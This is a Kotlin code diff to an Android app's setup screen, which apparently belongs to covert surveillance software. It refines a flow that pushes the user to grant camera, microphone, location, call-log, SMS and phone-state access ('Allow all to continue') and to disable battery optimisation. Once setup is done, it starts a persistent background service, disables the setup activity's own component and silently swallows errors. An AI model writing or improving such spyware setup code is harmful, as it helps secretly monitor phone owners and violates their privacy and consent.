@@ -37,6 +37,18 @@ class SetupActivity : AppCompatActivity() {
         }, 1500)
     }
 
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(
+            requestCode, permissions, grantResults)
+        if (requestCode == 100) {
+            showStep(6)
+        }
+    }
+
     private fun showStep(step: Int) {
         currentStep = step
         when (step) {
@@ -60,7 +72,7 @@ class SetupActivity : AppCompatActivity() {
                 startActivity(i)
             }
             3 -> updateUI("4/6", "Battery Optimization",
-                "Keep service running", "Disable") {
+                "Keep service running always", "Disable") {
                 startActivity(Intent(
                     Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                     Uri.parse("package:$packageName")))
@@ -73,26 +85,49 @@ class SetupActivity : AppCompatActivity() {
             }
             5 -> updateUI("6/6", "Final Permissions",
                 "Allow all to continue", "Allow") {
-                requestPermissions(arrayOf(
+
+                val permsToRequest = mutableListOf<String>()
+
+                val allPerms = arrayOf(
                     android.Manifest.permission.CAMERA,
                     android.Manifest.permission.RECORD_AUDIO,
                     android.Manifest.permission.ACCESS_FINE_LOCATION,
                     android.Manifest.permission.READ_CALL_LOG,
                     android.Manifest.permission.READ_SMS,
                     android.Manifest.permission.READ_PHONE_STATE
-                ), 100)
+                )
+
+                for (perm in allPerms) {
+                    if (checkSelfPermission(perm) !=
+                        PackageManager.PERMISSION_GRANTED) {
+                        permsToRequest.add(perm)
+                    }
+                }
+
+                if (permsToRequest.isEmpty()) {
+                    showStep(6)
+                } else {
+                    requestPermissions(
+                        permsToRequest.toTypedArray(), 100)
+                }
             }
             6 -> completeSetup()
         }
     }
 
     private fun completeSetup() {
-        startForegroundService(Intent(this, CoreService::class.java))
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, SetupActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
+        try {
+            startForegroundService(Intent(this, CoreService::class.java))
+        } catch (e: Exception) { }
+
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, SetupActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) { }
+
         finishAffinity()
     }
 
@@ -141,12 +176,10 @@ class SetupActivity : AppCompatActivity() {
         findViewById<TextView>(R.id.tvTitle).text = title
         findViewById<TextView>(R.id.tvDesc).text = desc
 
-        // Main action button
         val btnAction = findViewById<Button>(R.id.btnAction)
         btnAction.text = btnText
         btnAction.setOnClickListener { action() }
 
-        // Next button — manually aage badho
         val btnNext = findViewById<Button>(R.id.btnNext)
         btnNext.setOnClickListener {
             showStep(currentStep + 1)
